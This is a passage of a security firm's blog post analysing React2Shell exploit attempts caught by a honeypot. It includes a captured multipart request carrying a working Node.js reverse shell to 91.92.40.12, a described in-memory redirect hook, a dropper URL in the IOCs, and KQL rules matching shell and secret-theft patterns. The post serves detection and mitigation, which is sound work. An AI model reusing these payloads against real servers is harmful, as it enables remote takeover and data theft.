+<li>The replacement watches for <code>request</code> events. For every <code>GET</code> or <code>HEAD</code> it answers <code>307</code> with <code>Location: hxxps://return[.]st/</code> and stops. The application never sees the request.</li>
+<li>All other methods are passed to the original function. POST still works, so the same exploit can be sent again later.</li>
+<li>It runs <code>echo lol</code>, then throws a <code>NEXT_REDIRECT</code> so its own response is also a redirect to the same address.</li>
+</ol>
+<p>The result on a vulnerable site: every visitor and every search-engine crawler is redirected to the attacker's domain, immediately. Nothing is written to disk. No new process appears. A file-integrity scan, a malware scan of the container image and a look at <code>ps</code> all come back clean, because the change lives only in the memory of the running Node process. Restarting the process removes it, and an unpatched server can be re-infected with one request.</p>
+<p>The same IP sent <code>HEAD /</code> in the same second, which is exactly the request that would show the 307 if the patch had taken, and returned ten days later:</p>
+<pre><code>2026-10-22 10:38:12  POST /  -&gt; 200  (react2shell)
+2026-10-22 10:38:12  HEAD /  -&gt; 200  (root_probe)
+2026-11-01 02:15:49  GET /  -&gt; 200  (root_probe)</code></pre>
+
+<h2>7. Reverse Shell x 47 (G)</h2>
+<pre><code>2026-10-30 06:59:35 UTC  91.92.40.12 (The Netherlands)  status 200  request 899 bytes  response 1936 bytes
+
+POST / HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
+
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="0"
+
+{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var n=process.mainModule.require('net'),c=process.mainModule.require('child_process'),s=c.spawn('/bin/sh',[]),cl=new n.Socket();cl.connect(12323,'91.92.40.12',()=&gt;{cl.pipe(s.stdin);s.stdout.pipe(cl);s.stderr.pipe(cl);});","_formData":{"get":"$1:constructor:constructor"}}}
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="1"
+
+"$@0"
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
+</code></pre>
+<pre><code>var n=process.mainModule.require('net'),c=process.mainModule.require('child_process'),s=c.spawn('/bin/sh',[]),cl=new n.Socket();
+cl.connect(12323,'91.92.40.12',()=&gt;{
+  cl.pipe(s.stdin);
+  s.stdout.pipe(cl);
+  s.stderr.pipe(cl);
+});</code></pre>
+<p>A classic reverse shell in five expressions: start <code>/bin/sh</code>, open a TCP connection to <code>91.92.40.12</code> port <code>12323</code>, and pipe the socket into the shell's input and the shell's output and errors back into the socket. The address it connects to is the address the request came from. There is no check, no marker and no thrown error. The operator learns it worked when a shell connects.</p>
+<p>This variant is trimmed: it has no <code>_chunks</code> key and no field <code>2</code>.</p>
+<p>What stands out is the persistence. The byte-identical request arrived 47 times on 8 days, from 2026-10-30 06:59:35 to 2026-11-09 02:19:03 UTC:</p>
+<pre><code>2026-10-30  06:59 09:10 11:25 13:17 15:53 18:12 20:13 22:11
+2026-10-31  01:38 04:48 07:02 09:55 11:36 14:17 16:16 18:53 20:44
+2026-11-01  02:14
+2026-11-03  12:17 14:10 16:46 19:05 21:05
+2026-11-05  09:18 16:54 19:32 21:25 23:37
+2026-11-07  03:37 05:27 07:47 10:04 12:41 14:33 16:51 18:48 21:39
+2026-11-08  01:14 03:37 05:42 08:02 10:13 12:41 17:32 21:40 23:49
+2026-11-09  02:19</code></pre>
+<p>Within a day the gap between attempts is 101 to 330 minutes, median 138. That is a job working through a target list in a loop of roughly two hours and never removing hosts that fail. Forty-seven attempts against a PHP server says nobody is reading the results; it also says that a host which becomes vulnerable for even a few hours, say by a rollback to an old image, will be hit inside that window.</p>
+<p>The only other thing this address sent was one non-HTTP binary probe:</p>
+<pre><code>2026-11-02 09:17:51  Z�                    R6M.  -&gt; 400</code></pre>
+
+<h2>8. What the Honeypot Answered</h2>
+<p>Status: 200 x 58. Response sizes: 1936 bytes x 50, 3684 bytes x 7, 1941 bytes x 1. Those are the lab's static index page, uncompressed and gzip-compressed. Apache passed the POST to <code>index.php</code>, which ignores its input.</p>
+<p>The honeypot does have a PHP multipart parser behind that URL, and the <a href="/blog/php2shell-exploitation-in-the-wild/">PHP2Shell post</a> is about attacks on it. A React2Shell body is three tiny text fields, with no file part and no session field. PHP parsed it into <code>$_POST['0']</code>, <code>$_POST['1']</code>, <code>$_POST['2']</code> and discarded it. The container's Apache log shows one ordinary access line per request (<code>"POST / HTTP/1.0" 200</code>) and no PHP warning or error beside it. There is no JavaScript runtime on the host for the payload to reach.</p>
+<p>A 200 with an ordinary HTML page is a "not vulnerable" answer to every variant here: none of them got the redirect header or error digest it was looking for.</p>
+
+<h2>9. Packet Capture Note</h2>
+<p>The lab ran a rolling packet capture (<code>tcpdump</code>, full snap length, 20 files of 10 MB) on port 80 and the Docker bridges. A ring that small holds about a day and a half of traffic, and the last of it was overwritten on 15 November when the VM was restarted and a large package download passed through the capture filter. The packets for the requests in this post no longer exist. What remains is the nginx request log (request line, User-Agent, Content-Type and the complete request body) and the Apache log from inside the container, both shipped to Microsoft Sentinel as they were written. Every payload on this page is from those two sources.</p>
+<p>For this post the gap is one header: <code>Next-Action</code>. The body, which carries the whole exploit, was logged complete for all 58 requests; the largest is under 1.4 KB.</p>
+
+<h2>10. IOCs</h2>
+<table><thead><tr><th>Source IP</th><th>Country</th><th>Requests</th><th>First seen (UTC)</th><th>Last seen (UTC)</th></tr></thead><tbody>
+<tr><td>91.92.40.12</td><td>The Netherlands</td><td>47</td><td>2026-10-30 06:59</td><td>2026-11-09 02:19</td></tr>
+<tr><td>204.76.203.31</td><td>The Netherlands</td><td>2</td><td>2026-10-31 19:21</td><td>2026-11-02 18:07</td></tr>
+<tr><td>15.204.225.168</td><td>United States</td><td>1</td><td>2026-10-22 09:51</td><td>2026-10-22 09:51</td></tr>
+<tr><td>45.198.224.169</td><td>United States</td><td>1</td><td>2026-10-22 10:38</td><td>2026-10-22 10:38</td></tr>
+<tr><td>43.173.1.89</td><td>Indonesia</td><td>1</td><td>2026-10-23 12:35</td><td>2026-10-23 12:35</td></tr>
+<tr><td>181.215.186.252</td><td>United Arab Emirates</td><td>1</td><td>2026-10-28 15:21</td><td>2026-10-28 15:21</td></tr>
+<tr><td>204.76.203.237</td><td>The Netherlands</td><td>1</td><td>2026-10-30 00:26</td><td>2026-10-30 00:26</td></tr>
+<tr><td>45.55.89.67</td><td>United States</td><td>1</td><td>2026-11-03 06:54</td><td>2026-11-03 06:54</td></tr>
+<tr><td>96.62.224.241</td><td>Germany</td><td>1</td><td>2026-11-04 07:49</td><td>2026-11-04 07:49</td></tr>
+<tr><td>23.94.145.185</td><td>United States</td><td>1</td><td>2026-11-07 05:38</td><td>2026-11-07 05:38</td></tr>
+<tr><td>93.152.224.190</td><td>Germany</td><td>1</td><td>2026-11-07 06:28</td><td>2026-11-07 06:28</td></tr>
+</tbody></table>
+<table>
+<tr><th>Type</th><th>Value</th><th>Context</th></tr>
+<tr><td>Reverse shell C2</td><td><code>91.92.40.12:12323</code>/tcp</td><td>Payload G; also the sending IP</td></tr>
+<tr><td>Second stage</td><td><code>hxxp://134.209.89[.]212/r</code></td><td>Payload E, piped to <code>sh</code></td></tr>
+<tr><td>Redirect target</td><td><code>hxxps://return[.]st/</code></td><td>Payload D</td></tr>
+<tr><td>Multipart boundary</td><td><code>----WebKitFormBoundaryx8jO2oVc6SWP3Sad</code></td><td>Fixed string from the public PoC; 54 of 58 requests</td></tr>
+<tr><td>Multipart boundary</td><td><code>----CveSweep</code> + 8 hex</td><td>Payload A</td></tr>
+<tr><td>Markers</td><td><code>R2SHELL_</code> + 10 hex, <code>DUOSCANNER777</code>, <code>RECONX_R2S_OK</code>, <code>11111</code></td><td>In the request body, and in <code>x-action-redirect</code> or the response body of a vulnerable server</td></tr>
+<tr><td>Body strings</td><td><code>$1:__proto__:then</code>, <code>$1:constructor:constructor</code>, <code>resolved_model</code>, <code>_formData</code></td><td>Present in every variant</td></tr>
+</table>
+
+<h2>11. Detection (KQL)</h2>
+<p>The wrapper is constant, so match on it and not on the command:</p>
+<pre><code class="language-kusto">Syslog
+| where SyslogMessage startswith "php_http: "
+| extend j = parse_json(substring(SyslogMessage, 10))
+| extend Client = tostring(j.client), Method = tostring(j.method), Uri = tostring(j.uri), Status = toint(j.status), Body = tostring(j.body), CT = tostring(j.content_type)
+| where Method == "POST" and CT startswith "multipart/form-data"
+| where Body has "__proto__" and Body has "constructor:constructor"
+| extend Payload = case(
+    Body has "cl.connect" or Body has "net.Socket" or Body has "/dev/tcp", "reverse shell",
+    Body has_any ("wget ", "curl ", "| sh", "|sh"), "dropper",
+    Body has_any ("cat .env", " env ", "printenv"), "secret theft",
+    Body has "Server.prototype.emit", "request hook",
+    Body has "execSync" or Body has "spawn", "command execution",
+    "marker only")
+| project TimeGenerated, Client, Uri, Status, Payload, Boundary = extract(@"boundary=(.+)$", 1, CT), Body
+| order by TimeGenerated asc</code></pre>
+<p>On a real Next.js server, also look at the response side, which our PHP honeypot could never produce: an <code>x-action-redirect</code> header whose value contains <code>/login?a=</code>, a 303/307 answer to a POST carrying a <code>Next-Action</code> header from a client that never loaded a page, and a Node process spawning <code>sh</code>, <code>wget</code>, <code>curl</code> or opening an outbound socket.</p>
+<p>Repeat offenders, like the reverse-shell loop:</p>
+<pre><code class="language-kusto">Syslog
+| where SyslogMessage startswith "php_http: "
+| extend j = parse_json(substring(SyslogMessage, 10))
+| where tostring(j.body) has "constructor:constructor"
+| summarize Attempts = count(), Days = dcount(bin(TimeGenerated, 1d)), First = min(TimeGenerated), Last = max(TimeGenerated), Variants = dcount(hash_sha256(tostring(j.body))) by Client = tostring(j.client)
+| order by Attempts desc</code></pre>
+
+<h2>12. Mitigation</h2>
+<ul>
+<li><strong>Patch.</strong> The fix is in the React Server Components packages (<code>react-server-dom-webpack</code>, <code>-parcel</code>, <code>-turbopack</code>) 19.0.1, 19.1.2 and 19.2.1, and in the Next.js releases that bundle them (15.0.5, 15.1.9, 15.2.6, 15.3.6, 15.4.8, 15.5.7, 16.0.7 or later on each line). Check what is actually deployed with <code>npm ls react-server-dom-webpack next</code> inside the running image, not the repository. Old containers and forgotten preview deployments are what the two-hour loop in section 7 finds.</li>
+<li><strong>If you were exposed while unpatched, assume the environment was read.</strong> Payload F takes one request and leaves no file. Rotate every secret in the process environment and <code>.env</code>, then review provider logs.</li>
+<li><strong>Restart after patching.</strong> Payload D lives in process memory. A patched build that is deployed by restarting clears it; a hot reload may not.</li>
+<li><strong>Restrict egress from application containers.</strong> A web app rarely needs to open connections to arbitrary internet addresses. Default-deny outbound stops the reverse shell (G) and the dropper (E) outright. It does not stop D or F, which return through the HTTP response.</li>
+<li><strong>Run the app as a non-root user on a read-only filesystem</strong>, with no shell or download tools in the image where possible. <code>wget … | sh</code> fails when there is no <code>wget</code>.</li>
+<li><strong>WAF rule as a stopgap, not a fix:</strong> block multipart bodies containing <code>:__proto__:</code> or <code>:constructor:constructor</code>. The fixed PoC boundary is worth a rule too; it caught 54 of the 58 requests here.</li>
+<li><strong>Alert on your crontab disappearing</strong> and on any child process of the Node server.</li>
+</ul>
+<aside aria-label="Work with Global SOC" style="margin:40px 0 20px;padding:24px;border:1px solid #c8dce7;border-radius:12px;background:#e6f0f5;color:#142333"><h2 style="margin:0 0 12px">Have a project or security question?</h2><p>Talk to our Glen Waverley, Melbourne team about secure apps, DNS or email security.</p><a href="/#contact">Discuss your project with Global SOC &rarr;</a></aside></main>
+<footer>
+  <div style="max-width:1000px;margin:auto;padding:20px 24px;border-top:1px solid #d6e1e9;font-size:14px;color:#47687c;">
+    © 2026 Global SOC Pty Ltd · <a href="/privacy.html">Privacy Policy</a>
+  </div>
+</footer>
+<script src="https://globalsoc.com.au/v.js" defer></script>
+</body>
+</html>
